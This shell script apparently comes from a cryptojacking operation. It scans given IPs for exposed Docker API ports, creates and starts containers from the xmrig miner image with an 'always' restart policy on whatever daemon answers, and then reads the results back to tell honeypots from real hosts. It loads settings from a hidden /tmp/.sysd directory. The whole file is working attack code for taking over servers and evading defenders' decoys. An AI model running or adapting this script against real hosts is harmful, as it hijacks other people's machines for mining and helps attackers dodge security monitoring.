#!/bin/sh
# ============================================================================
# fake-vs-real test.
#
# Every host we touch accepts create (200/201) and start (200/204) - including
# ones that are obviously fabricated (a "256 vCPU / 1 TB" box whose list is one
# hand-typed object with a repeating a1b2c3d4... id, another emitting a 63-char
# id, another naming its image registry.internal.example/...). So write-side ACKs
# prove nothing. A real engine must echo *our* container back by the id it just
# gave us, with our image and a Created timestamp from right now.
#
# usage: sh _fake.sh ip [ip ...]
# ============================================================================
SYSDIR="${SYSDIR:-/tmp/.sysd}"
[ -r "$SYSDIR/worker.env" ] && . "$SYSDIR/worker.env"
IMAGE="${DOCK_IMAGE:-xmrig/xmrig}"
BODY="{\"Image\":\"$IMAGE\",\"Cmd\":[\"sleep\",\"600\"],\"Labels\":{\"kwxfake\":\"1\"},\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"}}}"
NOW=$(date +%s)

for ip in "$@"; do
    b=""; o=""; pv=""
    for p in 2375 2376 4243; do
        case $p in
            2376) hb="https://$ip:$p"; ho="-k" ;;
            *)    hb="http://$ip:$p";  ho=""  ;;
        esac
        v=$(curl -fsS $ho --max-time 4 "$hb/version" 2>/dev/null) || continue
        case "$v" in
            *ApiVersion*)
                pv=$(printf '%s' "$v" | grep -o '"ApiVersion": *"[0-9.]*"' | head -1 | cut -d'"' -f4)
                b="$hb"; o="$ho"; break ;;
        esac
    done
    [ -n "$b" ] || { echo "$ip  no-daemon"; continue; }
    bb="$b"; [ -n "$pv" ] && bb="$b/v$pv"

    cr=$(curl -sS $o --max-time 25 -w '|%{http_code}' -X POST \
              "$bb/containers/create?name=kwxfake" \
              -H 'Content-Type: application/json' -d "$BODY" 2>/dev/null) || cr="|000"
    id=$(printf '%s' "${cr%|*}" | grep -oE '[0-9a-f]{64}' | head -1)
    if [ -z "$id" ]; then
        echo "$ip  api=$pv create=${cr##*|} ID-NOT-64HEX ($(printf '%s' "${cr%|*}" | head -c 90))"
        continue
    fi
    st=$(curl -sS $o --max-time 20 -w '|%{http_code}' -X POST \
              "$bb/containers/$id/start" >/dev/null 2>&1; echo "$?")
    j=$(curl -sS $o --max-time 8 "$bb/containers/$id/json" 2>/dev/null) || j=""
    if [ -z "$j" ]; then
        echo "$ip  api=$pv id=$id  READBACK-404 (front does not route dynamic paths)"
        continue
    fi
    img=$(printf '%s' "$j" | grep -o '"Image":"[^"]*"' | head -1 | cut -d'"' -f4)
    cre=$(printf '%s' "$j" | grep -o '"Created":"[^"]*"' | head -1 | cut -d'"' -f4)
    rn=$(printf '%s' "$j" | grep -o '"Running":[a-z]*' | head -1 | cut -d: -f2)
    sni=$(printf '%s' "$j" | grep -o '"Status":"[^"]*"' | head -1 | cut -d'"' -f4)
    printf '%s  api=%s id=%s img=%s created=%s running=%s status=%s\n' \
        "$ip" "$pv" "$id" "${img:-?}" "${cre:-?}" "${rn:-?}" "${sni:-?}"
    # second, independent tell: a fresh create of a *different* name must add an
    # entry to the list. A canned list is frozen, so it cannot.
    cr2=$(curl -sS $o --max-time 25 -w '|%{http_code}' -X POST \
               "$bb/containers/create?name=kwxfake2" \
               -H 'Content-Type: application/json' -d "$BODY" 2>/dev/null) || cr2="|000"
    l2=$(curl -sS $o --max-time 8 "$bb/containers/json?all=1" 2>/dev/null) || l2=""
    n=$(printf '%s' "$l2" | grep -o 'kwxfake[0-9]*' | sort -u | tr '\n' ',')
    echo "     second create=${cr2##*|}  names_now_visible=[${n:-none}]"
done
